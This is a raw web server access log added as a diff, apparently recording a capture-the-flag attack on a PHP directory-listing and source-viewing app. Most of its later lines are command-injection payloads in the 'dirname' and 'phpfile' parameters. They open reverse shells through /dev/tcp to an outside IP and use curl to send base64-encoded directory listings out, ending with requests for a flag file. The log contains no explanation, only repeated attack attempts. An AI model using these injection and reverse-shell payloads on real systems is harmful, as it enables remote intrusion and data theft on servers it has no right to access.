@@ -1,0 +1,202 @@
+13.78.118.84 - "GET / HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /style.css HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /head.jpg HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=JN HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /JN/flag.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%E3%80%82/ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?file=111 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /favicon.ico HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=JN HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=JN/flag.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=.//waf.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /favicon.ico HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET / HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /style.css HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /head.jpg HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=JN HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=JN/flag.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=.//waf.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=.//displaySourceCode.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=listdir.php HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=listdir.php%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=./%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%20http://47.94.239.194:8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20sh%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%3C/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3E%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/80 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%200%3C%261%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%200%26%3C1%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/aaa%20%26||%26%20bash%20-i%20%3C%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/2333 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "POST /listdir.php?dirname=/ HTTP/1.1" 200 -
+aaa=1 
+13.78.118.84 - "GET /listdir.php?dirname=/ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/* HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /favicon.ico HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/* HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /favicon.ico HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/*/flag HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=/*/flag HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/ HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/%20&||&%20ls%20/var HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/%20&||&%20ls%20/var HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/%20%26||%26%20ls%20/var HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080 HTTP/1.1" 504 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?aaa=`ls%20/` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%20%2247.94.239.194:8080?=`ls%20/`%22 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?=`ls%20/` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`ls%20/|base64` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`ls%20/|base64` HTTP/1.1" 504 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`ls%20/|base64` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22system(%27ls%27);` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22system(%22ls%22);%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22system(%27ls%27);%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22system(%27ls%27);%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20system(\x5C%22ls%20/\x5C%22)` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc%20%26||%26%20curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 504 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;bash%20-i%20%3C%20/dev/tcp/47.94.239.194/8080 HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/etc;curl%2047.94.239.194:8080?a=`php%20-r%20%22echo%20base64_encode(shell_exec(\x5C%22ls%20/\x5C%22));%22` HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /listdir.php?dirname=/flagggggggggggggg_1s_here HTTP/1.1" 200 -
+- 
+13.78.118.84 - "GET /displaySourceCode.php?phpfile=/flagggggggggggggg_1s_here/flag HTTP/1.1" 200 -
+- 
